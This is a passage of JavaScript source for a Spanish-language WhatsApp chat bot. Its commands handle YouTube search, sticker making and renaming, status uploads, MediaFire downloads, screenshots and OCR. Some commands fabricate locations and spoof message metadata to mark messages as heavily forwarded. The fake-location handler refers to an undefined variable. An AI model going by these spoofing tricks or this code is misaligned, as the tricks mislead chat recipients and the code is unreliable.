                description: `Duración: ${ms(Number(akd.videos[hah].duration + '000'))}\nid: ${akd.videos[hah].id}`,
                              "rowId": `${prefix}ytmp4 https://www.youtube.com/watch?v=${akd.videos[hah].id}`
                           }
                        ]
      })
        hah += 1
       } 
      const po = kev.prepareMessageFromContent(from, {
          "listMessage":{
                  "title": "*Youtube Busqueda By ~Kevin~*",
                  "description": `*Resultados de: ${arg}*`,
                  "buttonText": "Resultados",
                  "listType": "SINGLE_SELECT",
                  "sections": dowl
              }}, {quoted: faketroli}
              ) 
            kev.relayWAMessage(po)
break
case 'gethex':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
gethex = vin.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("hex")
kev.sendMessage(from, `${gethex}`, MessageType.text, fakevin)
break
case 'get64':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
get64 = vin.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64")
kev.sendMessage(from, `${get64}`, MessageType.text, fakevin)
break
case 'fakeloc': // Fix Kevin (deleted location)
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
           var kntl = body.slice(8)
         var nama = kntl.split("|")[0];
        var impostor = kntl.split("|")[1];
                     kev.sendMessage(from, { name: nama,
            address: imspostor,
                        jpegThumbnail: fakeimg }, MessageType.location, {quoted: vin})
                 
        break
case 'fakepdf': //fakePDF
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
           var fakepdf = body.slice(8)
        var carin = fs.readFileSync('./media/gil2.jpeg')
        var pdf = fs.readFileSync('./kev/files/kevin.pdf')
                     kev.sendMessage(from,pdf, MessageType.document, {quoted: vin, mimetype: "application/pdf", filename: `${fakepdf}.pdf`, thumbnail: fs.readFileSync('./media/gil2.jpeg'), sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
        break
case 'robar':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                  if (!isQuotedSticker) return reply(`Para cambiarle el nombre a un sticker mencionalo junto al comando:\n\n*${prefix}robar KEVIN :D*`)
                  const encmedia = JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                  const media = await kev.downloadAndSaveMediaMessage(encmedia, `./sticker/${senderfix}`)
                  const packname = arg
                  const MatadataFix5 = {
        type: 'full',
        pack: `${packname}`,
        author: '',
        categories: [
            '🌹'
        ]
        }
      const cambiador = await createSticker(`./sticker/${senderfix}.webp`, MatadataFix5)
                  kev.sendMessage(from, cambiador, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(media)
            break
case 'pushname':
        case 'push':
        case 'p':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (isMedia && !vin.message.videoMessage || isQuotedImage) {
      const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
      const media = await kev.downloadAndSaveMediaMessage(encmedia, `./sticker/${senderfix}`)
      reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
      await ffmpeg(`${media}`)
      .input(media)
      .on('start', function (cmd) {
      console.log(`Started : ${cmd}`)
      })
      .on('error', function (err) {
      console.log(`Error : ${err}`)
      fs.unlinkSync(media)
      reply('error')
        })
      .on('end', async function () {
      console.log('Finish')
      const MatadataFix33 = {
        type: 'full',
        pack: `KevBot\n\n${pushname}`,
        author: '',
        categories: [
            '🌹'
        ]
        }
      const sticker4s2 = await createSticker(`./sticker/${senderfix}.webp`, MatadataFix33)
      kev.sendMessage(from, sticker4s2, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
      fs.unlinkSync(media)  
      fs.unlinkSync(`./sticker/${senderfix}.webp`)  
      })
      .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
      .toFormat('webp')
      .save(`./sticker/${senderfix}.webp`)
      } else if ((isMedia && vin.message.videoMessage.fileLength < 10000000 || isQuotedVideo && vin.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
      const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
      const media = await kev.downloadAndSaveMediaMessage(encmedia, `./sticker/${senderfix}`)
      reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
      await ffmpeg(`${media}`)
      .inputFormat(media.split('.')[4])
      .on('start', function (cmd) {
      console.log(`Started : ${cmd}`)
      })
      .on('error', function (err) {
      console.log(`Error : ${err}`)
      fs.unlinkSync(media)
      tipe = media.endsWith('.mp4') ? 'video' : 'gif'
      })
      .on('end', async function () {
      console.log('Finish')
      const MatadataFix412 = {
        type: 'full',
        pack: `KevBot\n\n${pushname}`,
        author: '',
        categories: [
            '🌹'
        ]
        }
      const sticker5s23 = await createSticker(`./sticker/${senderfix}.webp`, MatadataFix412)
      kev.sendMessage(from, sticker5s23, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
      fs.unlinkSync(media)
      fs.unlinkSync(`./sticker/${senderfix}.webp`)
      })
      .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
      .toFormat('webp')
      .save(`./sticker/${senderfix}.webp`)
          } else {
      reply(`Envíe una foto/video + el comando ${prefix}pushname\n\nTambién funciona si mencionas una foto o video junto al mismo comando\n\nNota: La duración máxima del video es de 10 segundos`)
      }
        break
    case 'subirtexto':
            if (!yo && !isOwner) return
            if (!q) return reply('Que texto deseas subir a tu estado?')
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            kev.sendMessage('status@broadcast', `${q}`, extendedText)
            reply(`Estado subido: *${q}*`)
            break
    case 'subirimagen':
    if (!yo && !isOwner) return
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            cihcih = await kev.downloadMediaMessage(swsw)
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            kev.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Imagen subida a tu estado con el subtitulo: *${q}*`
            kev.sendMessage(from, bur, text, { quoted: vin })
            } else {
            reply('Menciona una imagen!')
            }
            break
    case 'subirvideo':
    if (!yo && !isOwner) return
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            cihcih = await kev.downloadMediaMessage(swsw)
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            kev.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Video subido a tu estado con el subtitulo: *${q}*`
            kev.sendMessage(from, bur, text, { quoted: vin })
            } else {
            reply('Menciona un video!')
            }
            break
    case 'publico':
          	if (!vin.key.fromMe && !isOwner) return 
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	reply(`「 *MODO PUBLICO ACTIVADO* 」`)
          	break
	case 'self':
          	if (!vin.key.fromMe && !isOwner) return
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	reply(`「 *MODO SELF ACTIVADO* 」`)
          	break

case 'mediafire':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (args.length < 1) return reply('y el link?? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Link invalido, el link debe ser de MediaFire')
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
let ment = args.join(' ')
const resm = await zenmediafire(ment)
result = `  *🧇 「  Mediafire Download  」 🧇*

🧇 *Nombre:* ${resm[0].nombre}

🧇 *Tamaño:* ${resm[0].size}

🧇 *Enlace:* ${resm[0].link}

_*El archivo se esta enviando, si vez que el archivo no puedes abrirlo desde el mismo WhatsApp, simplemente ve a la carpeta de tu whatsapp luego a documents y alli dentro veras el archivo descargado...*_`
kev.sendMessage(from, fakeimg, MessageType.image, {quoted: vin, caption: result, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
sendFileFromUrl(resm[0].link, MessageType.document, {mimetype: resm[0].mime, filename: resm[0].nombre, quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
break
/// HERRAMIENTAS
case 'captura': 
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
    if (!q) return reply('Envia un enlace de algun pagina web para que el bot mande una captura de pantalla de tu web')
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
        try {
			eses = await axios.get(`https://shot.screenshotapi.net/screenshot?url=${q}`)
		kev.sendFile(from, eses.data.screenshot, null, `_🖼️ Captura De Pantalla De La Página: ${q}_

*• By Kevin*`, vin, false, {thumbnail: fakeimg})
			} catch (e) {
				e = String(e)
				console.log(color(e, 'red'))
				reply(e)
				}
        break
case 'ocr':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if ((isMedia && !vin.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vin
            const media = await kev.downloadAndSaveMediaMessage(encmedia)
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            await recognize(media, {lang: 'eng+ind+esp', oem: 1, psm: 3})
            .then(teks => {
            kev.sendMessage(from, teks.trim(), MessageType.text,fakevin)
            fs.unlinkSync(media)
            })
            .catch(err => {
            reply(err.message)
            fs.unlinkSync(media)
            })
            } else {
            reply('Solamente imagenes.')
            }
        break
case 'leermas':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (args.length < 1) return reply(`Para crear un texto en forma de leer mas.... simplemente usa: *${prefix}leermas texto | texto*`)
            var kls = arg
            var has = kls.split("|")[0];
            var kas = kls.split("|")[1];
            if (args.length < 1) return reply('Y EL MENSAJE??')
            kev.sendMessage(from, `${has}‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎${kas}`, MessageType.text, {quoted : vin})
        break
   case 'perfil':
   if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
    if (vin.message.extendedTextMessage != undefined){
          mentioned = vin.message.extendedTextMessage.contextInfo.mentionedJid
          try {
            pic = await kev.getProfilePicture(mentioned[0])
          } catch {
            pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
          }
          thumb = await getBuffer(pic)
